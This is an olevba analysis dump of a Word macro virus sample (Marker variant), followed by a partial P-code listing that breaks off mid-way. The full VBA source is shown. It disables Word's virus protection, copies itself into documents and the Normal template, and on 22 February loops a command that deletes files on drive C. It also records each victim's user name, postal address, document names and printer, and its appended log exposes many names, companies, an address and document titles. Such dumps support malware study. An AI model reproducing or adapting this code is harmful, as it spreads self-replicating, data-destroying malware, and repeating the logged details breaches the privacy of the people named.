olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.x
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.x - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Private Sub Document_Close()
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
On Error Resume Next
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Dim ad, nt As Object
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Dim rep, x As Integer
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Dim virusCode, UserAddress, LogData, LogFile As String
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Options.VirusProtection = False
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Options.SaveNormalPrompt = True
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Delivery:
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If Day(Now()) = 22 And Month(Now()) = 2 Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Kill "C:\*.*":
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
GoTo Delivery
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If DocumentInfected = True Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
SaveNormalTemplate = NormalTemplate.Saved
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
For i = 1 To Len(Application.UserAddress)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Else
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
UserAddress = UserAddress & Chr(13) & "' "
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Next i
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
virusCode = virusCode & LogData
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
nt.codemodule.AddFromString virusCode
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
With nt.codemodule
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End With
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
With nt.codemodule
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
For x = 45 To 181 Step 2
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Next x
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End With
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If SaveNormalTemplate = True Then NormalTemplate.Save
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If NormalTemplateInfected = True Then
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
SaveDocument = ActiveDocument.Saved
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
ad.codemodule.AddFromString virusCode
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
nt.codemodule.AddFromString virusCode
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
ad.codemodule.Deletelines 174, 13
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
With ad.codemodule
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
For x = 45 To 181 Step 2
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Next x
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End With
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
If SaveDocument = True Then ActiveDocument.Save
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End If
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
Options.SaveNormalPrompt = False
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
End Sub
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
' Wuxb 俻倀俙俢楢棈彂0213.doc00/02/13 16:58:51EPSON VP-1100 - \\TONTRU\EPSON
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
' Wuxb 俻倀俙俢楢棈彂0213.doc00/02/13 16:58:51EPSON VP-1100 - \\TONTRU\EPSON
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:
' Wuxb 俻倀俙俢楢棈彂0213.doc00/02/13 16:58:51EPSON VP-1100 - \\TONTRU\EPSON
' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:

' OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:

' Hotlist1.doc

' Roy Zornow resume.doc

' TK Move Manager.doc

' AU Business Manager.doc

' GDLUCK.DOC

' NOMURA.doc

' Operations Generalist.doc

' PBX Telecom Coordinator.doc

' resume.doc

' parm_meegada.doc

' Pramit.doc

' HOTLIST1.doc

' Toshinobu SHIIKI.doc

' Jacob Jacobs.doc

' cv_focus.doc

' letter2.doc

' Hot List 05-27-1999.doc

' Ashwat.doc

' dbaunix.doc

' juno.doc

' CVMBA.doc

' RESUME399.doc

' Alex Lam.doc

' Senior Unix Administrator.doc

' Senior Unix Administrator.doc

' RESUME LATEST11.doc

' Ryuji Iwamoto1.doc

' Document1

' Sivaram Venkata1.doc

' Dean's Resume Current.doc

' infrmgr.doc

' Alan LEE.doc

' Jackson YAU.doc

' Patrickshum.doc

' Resume.doc

' CurrVit (1).doc

' SaleTar.doc

' Gerald Sanderson.doc

' Lee-A.doc

' carmel~1.doc

' 990116.res-detail-ltt.doc

' resume.doc

' Ad tech supp.doc

' Interview Discussion Items.doc

' Rres97j.doc

' Cvrltra.doc

' HOTLIST1.doc

' Mar-W.doc

' thomas chu.doc

' 09:17:55 AM -Monday,21 Jun,1999
' hunga
'
' Thomas Chu.doc

' PC Asset Change Form Proliant 5000.doc

' fax.template2.doc

' EAS Fax 19990622.doc

' ~0040067.doc

' ~0002553.doc

' 19990609summary.doc

' 04:05:14 PM -Friday,16 Jul,1999
' chanjim
'
' 19990702summary.doc

' Doc1.doc

' Document1

' Document1

' offsite1.doc

' offsite2.doc

' Cover Letter for your Resume.doc

' ~0058164.doc

' Document1

' Doc1.doc

' Document2

' Document3

' Fax.doc

' 03:31:57 PM -Friday,23 Jul,1999
' leed
'
' Fax.doc

' RES0699b.doc

' Document1

' KTB.doc

' KTB.doc

' Ww260799.doc

' Ww260799.doc

' wwh260799.doc

' wwh260799.doc

' wwh260799.doc

' Document1

' Document1

' offsite1.doc

' th0727a.doc

' corp-chart.doc

' RES0699b.doc

' BIRTHDAY.DOC

' th0729adoc.doc

' th0729adoc.doc

' 03:13:09 PM -Thursday,29 Jul,1999
' andrewti
'
' ~0061018.doc

' Exit Strategy .doc

' Document1

' Morning meeting roster.doc

' Meralco.doc

' GAS_Bst0799.doc

' Response to Mark Ogle.doc

' Doc11_.doc

' ~0025144.doc

' bt9flyer.doc

' A crocodile cannot stick its tongue out.doc

' Document1

' gas0899.doc

' smtm.....doc

' foster.doc

' Final meeting follow up memo.doc

' Document3

' frontpage.doc

' 09:52:49 AM -Tuesday,3 Aug,1999
' manc
'
' Fronttext.doc

' Elmu_Text.doc

' Aug99.doc

' 04:21:03 PM -Tuesday,3 Aug,1999
' lisaw
'
' AUG99.DOC

' Utilitiesfinal.doc

' SthAfricafinal.doc

' GAS9908.DOC

' 03:16:20 PM -Friday,6 Aug,1999
' East
'
' Gas9908.doc

' StratAsia-Aug99-report.doc

' 11:39:18 AM -Saturday,7 Aug,1999
' XPRESS PRINT
'
' StratAsia-Aug99-report.doc

' Document1

' hk2004-2.doc

' 06:41:32 PM -Friday,13 Aug,1999
' Xpress Print Pte Ltd
'
' hk2004-2.doc

' Document1

' 9907381(appen2).doc

' new2(13Aug).doc

' App5.doc

' 09:36:50 AM -Wednesday,18 Aug,1999
' xpress
'
' App5new4(18Aug_am).doc

' CCZ.doc

' MEMORANDUM for flashing of access card.doc

' STB.doc

' 08:57:52 AM -Monday,23 Aug,1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' STB.doc

' Press Release.doc

' Document1

' Despatch form.doc

' invitation.doc

' swensen-suntec invite - 13 Aug 1999.doc

' GulPR.doc

' fax-cover.doc

' Document3

' Quotation Requisition Form_.doc

' Quotation Requisition.doc

' Gul Tech-MediaList.doc

' fax-cover.doc

' ProdVPE.doc

' CorpVPE.doc

' mediafax.doc

' Nobel-Media List (Aug 19'99).doc

' Nobel-Media List (Aug 19'99).doc

' fax-cover.doc

' Document5

' billingadvice.doc

' fax-cover.doc

' NobelPR.doc

' Nobel-PR (Aug 23'99).doc

' newslettersPE.doc

' Delivery Order.doc

' fax-cover.doc

' logoPE.doc

' posterPE.doc

' badgesPE.doc

' videoPE.doc

' fax-cover.doc

' fax-cover.doc

' News Clippings.doc

' timesheet.doc

' CSA-Schroders.doc

' Arthur Andersen - Project (Aug 25 '99).doc

' Johnson & Johnson - Event Mgmt- CSA (Sept 4).doc

' fax-cover.doc

' IT Request Form.doc

' Shirley-2.doc

' Document1

' Prod.Estimate.doc

' September.doc

' fax-Joachim.doc

' fax-cover.doc

' timesheet.doc

' fax-cover-JL.doc

' Gul-AnalystInvite (Aug 27'99).doc

' Gul-PressInvite (Aug 27'99).doc

' Gul-AnalystInvite (Aug 27'99).doc

' Gul-AnalystInvite.doc

' Hotel's Contact.doc

' Gul-PressInvite (Aug 27'99).doc

' Sponsorship for Suntec City.doc

' fax-cover-JL.doc

' timesheet.doc

' fax-cover-JL.doc

' fax-cover-JL.doc

' fax-cover-JL.doc

' solar eclipse.doc

' GulTech-MediaAttend (Aug 30'99).doc

' August.doc

' fax-cover-JL.doc

' GulTech-AnalystAttend (Aug 30'99).doc

' GulTech-MediaAttend2 (Aug 30'99).doc

' fax-cover-JL.doc

' fax-JC2.doc

' fax-cover-JL.doc

' FJ1.doc

' Security Houses List(Sept 3'99).doc

' e-mooncake -Media List (Aug 7'99).doc

' mediafax.doc

' Press invite (Sept 3).doc

' Document2

' i-One write-up.doc

' psb.pr.amend.doc

' psb - PR (Sept 2'99).doc

' Document2

' Document3

' Internal Memo.doc

' Press Attend (Sept 3'99).doc

' psb - PR (Sept 3'99).doc

' proposal-1.doc

' Budget emooncake(Sept 3'99).doc

' 02:48:25 PM -Saturday,4 Sep,1999
' cd
' Stratagem Consultants
' Communications Techno Centre
' 1 Kallang Way 2A
' Singapore 347495
' Budget emooncake(Aug 11'99).doc

' Chinois invite card text.doc

' prog-Ngee Ann Swensens.doc

' TCS-Oct 16.doc

' InternalMinutesSEP06.doc

' September.doc

' BOOTH DATA.doc

' Money World Asia poster.doc

' techno1.sub.doc

' oracle statement.doc

' timetable.doc

' Chinois Programme.doc

' NRIC Form.doc

' EPPU HEAD REFERENCES.doc

' checklist-Chinois 26 Sept.doc

' GITIS FAQs.doc

' GITIS FORM.doc

' GITIS.doc

' budget2.doc

' InternalMinutesSEP10.doc

' checklist BCA.doc

' September.doc

' STRATAGEM-CREDENTIAL.doc

' ABR minutes.doc

' Document1

' 16 Sept - Min.doc

' Document1

' Chinois i-one-food release.doc

' 02:00:55 PM -Saturday,25 Sep,1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' Chinois i-one-food release.doc

' DesignerAllocation_990909b.doc

' I-One Kiosk - Schedule of Activities.doc

' Suntec_990914directory.doc

' Food_photo990923.doc

' TP_Schedule of Activities_990927.doc

' Zhi Hong.doc

' Ecommerce_JCF.doc

' e-commerce_JCF_990915.doc

' Document1

' Yi Leng electronics2.doc

' new_JCF2.doc

' JV Goldsmith.doc

' 03:15:24 PM -Thursday,30 Sep,1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' JV Goldsmith.doc

' Joy Doggy.doc

' hay's.doc

' Beauty Glow Dermal.doc

' Beauty Glow Dermal.doc

' Joy Doggy Pet Shop.doc

' anak.doc

' 02:59:49 PM -Friday,8 Oct,1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' anak.doc

' JTC script1.doc

' amconics.doc

' Backup of One Stop Beauty.wbk

' beauty asia2.doc

' Bodhicherie Vegetarian.doc

' First Love.doc

' Joy Doggy.doc

' Le Style Home.doc

' prindeli confectionery.doc

' The Face Concept.doc

' Document1.doc

' Document2.doc

' Document1.doc

' Document1

' video.doc

' NTUCscript.doc

' video.doc

' JTC script1.doc

' Orchid Country Club.doc

' JTC script1.doc

' jOB Status.doc

' JTC script1.doc

' job status.doc

' job status.doc

' video.doc

' Document1

' Document2.doc

' NTUCscript.doc

' NTUCscript.doc

' 06:02:13 PM -Friday,15 Oct,1999
' zhouqin
'
' NTUCscript1.doc

' English script.doc

' new teleskill all.doc

' HQ_MM.doc

' future_MM.doc

' 09:27:22 下蝸E-星期一,18 十月,1999
' mm_user
'
' future_MM.doc

' Delco Scripts.doc

' name card.doc

' pg1_ningqiaoli.doc

' 02:28:40 PM -Tuesday,19 Oct,1999
' Alex Tham
' CNNHS B'92 PHILIPPINES (CNSC)
' pg1_ningqiaoli.doc

' Document1

' 1013_SSIS.doc

' Document2

' 1008_CSSD_CD.doc

' 1003_CSSD.doc

' 1002_CSSD.doc

' Benifit.doc

' STRIKE ACCOUNTS.doc

' pg1_zhouqin.doc

' Zhuqinhua.doc

' Document1

' Suzhou Letter of Acceptance Cover Ltr(new).doc

' progress report on HK & Suzhou offices.doc

' confirm_alex.doc

' Reference Book.doc

' PR_ISDN.doc

' 02:48:32 PM -Tuesday,26 Oct,1999
' xpress_sz
'
' PR_ISDN.doc

' Issue Chq_5.doc

' Karyn.doc

' Photocopy&C_Printer.doc

' Contribution to XMS.doc

' Profit Centre proposal.doc

' Sheraton - Frank Fan.doc

' Issue Chq_4.doc

' Meeting with Spore Consult.doc

' Grundfos.doc

' POSB.doc

' Hi everybody at home.doc

' Internet Bar info.doc

' conference chair.doc

' Grundfos_2.doc

' Release Letter.doc

' Joseph_STB.doc

' Erik Wang-TDBShanghai.doc

' wuyanlong.doc

' Bob.doc

' room.doc

' Sheraton - Sam Chen.doc

' Yen.doc

' lh.doc

' Air Cond maintenance.doc

' CaiJiXian.doc

' newpaper cutting.doc

' Logic.doc

' Int School.doc

' Memo.doc

' Kum Thye.doc

' 2610_2.doc

' newstaffe.doc

' 19981.doc

' Xu Wei.doc

' tiaoxin.doc

' maket.doc

' Document3

' staff list.doc

' CD.doc

' newstaffe.doc

' aa.doc

' work2.xls

' multimedia.doc

' Address.doc

' renewal.doc

' maket_1.doc

' Video.doc

' TV Set.doc

' XMSZ_maket.doc

' 01.doc

' Busway_text_c.doc

' 0211_caijixian.doc

' Doc1.doc

' Multimedia - Addition.doc

' Chartered Asset Management.doc

' Ci Min Beauty Workshop.doc

' Cyber Dome Internet Cafe.doc

' Chuan Cheong Building & Construction.doc

' Facial Art de Beauty.doc

' JV Goldsmith & jewellery.doc

' Doc1.doc

' Telephone.doc

' 10.doc

' disclaimer.doc

' ying.xls

' 1998.doc

' 1.doc

' Book1.xls

' ren.doc

' Dephi.doc

' CP.doc

' LSB.doc

' PJH.doc

' CZY.doc

' Document1

' English script.doc

' 4050A.doc

' yuhuayuan.doc

' 1965.doc

' Advances.doc

' Garden Plaza.doc

' 09:52:51 AM -Friday,19 Nov,1999
' Lim
'
' Garden Plaza_E.doc

' 文档1

' 关于人力资源管历潸佝营蟻Edoc

' 润发公寓预算方案.doc

' 上周工作报告（11。8~12）.doc

' 辞职蓙E丒丒doc

' 辞职蕘Edoc

' 售后服务记录.doc

' 考勤说脕E.doc

' 人事说脕E.doc

' 考勤说脕E.doc

' 仓库工作流程.doc

' REVIEW.DOC

' 工资说脕E.doc

' 文档1

' 上周工作报告（11.15~11.19）.doc

' 文档1

' 人事.doc

' 19991117.doc

' 单个模縼Edoc

' 公司简介E.doc

' Contract.doc

' file002 (4).DOC

' 周界报警器材.doc

' HuPrice.doc

' 产品装箱单.doc

' 使用鳃佝.doc

' Gaoda Co. Ltd.doc

' 上周技术开发情况汇报.doc

' construct (1).doc

' account.doc

' Week Plan.doc

' Humen Resource.doc

' 贵夫人.DOC

' 工艺文~1.DOC

' Check and Accept.doc

' 工艺单~1.DOC

' gz1.doc

' 贵妇人~2.DOC

' 贵夫人~1.DOC

' 贵妇人~1.DOC

' 贵妇人~3.DOC

' 贵妇人~4.DOC

' 贵妇人~5.DOC

' 贵妇人.DOC

' 文档2

' 文档1

' file002 (4).DOC

' file003.DOC

' file002 (4).DOC

' file002 (4).DOC

' file002.DOC

' file002 (5).DOC

' file002 (5).DOC

' file002 (5).DOC

' file003 (1).DOC

' 工艺技~2.DOC

' 工艺技~1.DOC

' 工艺文~1.DOC

' 工艺文~2.DOC

' 工艺文档.DOC

' CRT考勤仪通讯协襾Edoc

' 富士通消嗫报竵Edoc

' 600巇條4.doc

' file002 (6).DOC

' file002 (7).DOC

' file002 (7).DOC

' file002 (7).DOC

' file004.DOC

' file003 (3).DOC

' file002 (7).DOC

' file002.DOC

' file002 (8).DOC

' 考勤说脕E.doc

' file003.DOC

' file004.DOC

' file_ (1).doc

' file_ (1).doc

' 文档bak.doc

' to Mr. Zhu.doc

' fax.doc

' Archive.doc

' Product3.doc

' 移交报竵Edoc

' 工程安装协襾Edoc

' 工程合同.doc

' 决算眮Edoc

' 系统工程消嗫.doc

' 周界报警器材.doc

' 关于PTD的补充协襾Edoc

' 第三代保安电子巡竵E低矴S1000.doc

' XIEYI.doc

' 工程合同1.doc

' donwu.doc

' XIEYI（DW）.doc

' 吴县市东吴花园.doc

' 东吴花园周界报警.doc

' 东吴花园方案.doc

' 总詠E?doc

' 润发方案1.doc

' 产品报价单.doc

' 功能比较、分蝸Edoc

' 公司以往消嗫简絹Edoc

' 函竵Edoc

' ygy.doc

' 交验单.doc

' 佳安函竵Edoc

' 滨河花园方案.doc

' 东吴合同.doc

' 苏州新馨置地有限公司（gx）.doc

' 馨都二期方案.doc

' 三星苑住宅小区安全技术防范方案.doc

' 樱缘方案.doc

' 东吴方案（含合同）.doc

' 嘉怡苑2.doc

' 三星苑住宅小区安全技术防范方案.doc

' Joe Lee.doc

' TY ECU愝掕婍僥僗僩巇條彂.doc

' TY ECU愝掕婍僥僗僩巇條彂.doc

' Joe Lee.doc

' Joe Lee.doc

' file_ (1).doc

' file.doc

' 文档1

' EResume.doc

' CResume.doc

' readme.doc

' Sample.doc

' Contract1.DOC

' 向隆塑胶预算方案.doc

' 市区address.doc

' 协  襾E 书（欧莱雅）.doc

' 安德鲁电信.doc

' 百得合同.doc

' 本周计划.doc

' 新产品报价单.doc

' 合作框架协襾Edoc

' Product1_0.doc

' 199922.doc

' 常蕘Eddress.doc

' 威尼斯方案.doc

' Sample.doc

' Contract1.DOC

' Throwaway.doc

' Price.doc

' Contract for Service.doc

' Contract2.DOC

' Database8.doc

' Tables.DOC

' 封脕Edoc

' 文档.doc

' 高磥E��?doc

' 面试考虂Edoc

' 人力资源.doc

' 封脕Edoc

' 封脕E.doc

' 人力资源封脕E.doc

' O1.doc

' Company1.doc

' Product.doc

' Product1.DOC

' Product1.doc

' Product1_0.doc

' Packaging1.doc

' Advert1.doc

' IT.doc

' 考勤系统简絹Edoc

' 公司介绍.doc

' 公 司 絹E绍1.doc

' 高磥E记诩�成系�?doc

' Test.doc

' Task.doc

' Rlzyxsjh.doc

' 03:25:32 屵屻 -Sunday,13 Feb,2000
' Wuxb
'
' Rlzyxsjh.doc

' Price.doc

' xsjh.doc

' 俻倀俙俢楢棈彂0213.doc

' 俻倀俙俢楢棈彂0213.doc

' 俻倀俙俢楢棈彂0213.doc

' 俻倀俙俢楢棈彂0213.doc

' 09:36:47 PM -Sunday,13 Feb,2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' VIRUS1.DOC

' Doc3.doc

' Doc2.doc

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.x
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 50741 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:"
' Line #45:
' 	FuncDefn (Private Sub Document_Close())
' Line #46:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:"
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:"
' Line #49:
' 	Dim (Const) 
' 	LitStr 0x000A "Yugoslavia"
' 	VarDefn from
' 	QuoteRem 0x001A 0x0032 "nuthin' to do with the GeNiUs just needed a marker"
' Line #50:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:"
' Line #51:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #52:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:"
' Line #53:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #54:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:"
' Line #55:
' 	Dim 
' 	VarDefn rep
' 	VarDefn x (As Integer)
' Line #56:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:"
' Line #57:
' 	Dim 
' 	VarDefn virusCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #58:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:"
' Line #59:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #60:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:"
' Line #61:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #62:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:"
' Line #63:
' 	Ld from 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #64:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:21Epson LQ-1600K on LPT1:"
' Line #65:
' 	Ld from 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #66:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #67:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #68:
' 	QuoteRem 0x0000 0x003A " OPEY A. Doc2.doc2000-2-13 21:39:22Epson LQ-1600K on LPT1:"
' Line #69:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #70:
